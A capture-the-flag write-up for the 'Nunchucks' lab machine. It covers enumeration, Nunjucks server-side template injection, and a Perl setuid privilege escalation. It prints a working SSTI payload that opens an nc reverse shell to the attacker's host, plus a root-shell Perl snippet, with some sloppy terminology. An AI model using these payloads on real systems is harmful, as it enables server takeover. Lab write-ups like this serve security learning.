# Nunchucks Writeup
### Key Words: Server Side Template Injection(SSIF), Perl Paylaod 
First of of we will do a nmap on target machine. We find some open ports like 22 (ssh), 80 (http), 443 (https). After that we will run gobuster on the domain.

In the results we will find a subdomain:

```
store.nunchucks.htb
```

This is a static page which is allows us to enter a email only.

There is the possibility of Server Side Template Injection(SSTI) here. 

<aside>
💡 Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.

  
</aside>

There are many template injection like ade, Handlebars, JsRender, PugJs and NUNJUCKS.

Wait a minute what is our machine name “Nunchucks”, now we got our ans so we will use NUNJUCKS injection here. 

We tried out an email like **{{9*9}}@devil.com**

In result I get **81@devil.com** that ensured that there is a SSIF.

Now what is our next approach?

Yes, We intercept the request in burp suite and then we will upload a reverse shell payload in the email parameter and try to connect a shell with the machine.

```
Payload: {{range.constructor("\return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc #ip #port >/tmp/f')\")()}}
```

Now we got a shell, after stabilizing the shell we will go inside ‘david’ folder and got our **user.txt** flag.

Here we saw a perl file and we can the access of this file. Now we know that this machine is running perl so we make a payload.

I reused the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.
```perl
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash"
```

After running this we will payload we can see that now we have the root privileges and we are root now.

Now we simply so to /root folder and get the root.txt flag.

Hope you like this writeup, if you like it please show some love by follow me on:

GitHub: [https://github.com/mvaibhavm09](https://github.com/mvaibhavm09)

LinkedIn: [https://linkedin.com/in/mvaibhavm09](https://linkedin.com/in/mvaibhavm09)

Twitter:  [https://twitter.com/mvaibhavm09](https://twitter.com/mvaibhavm09) 

Happy Hacking :)
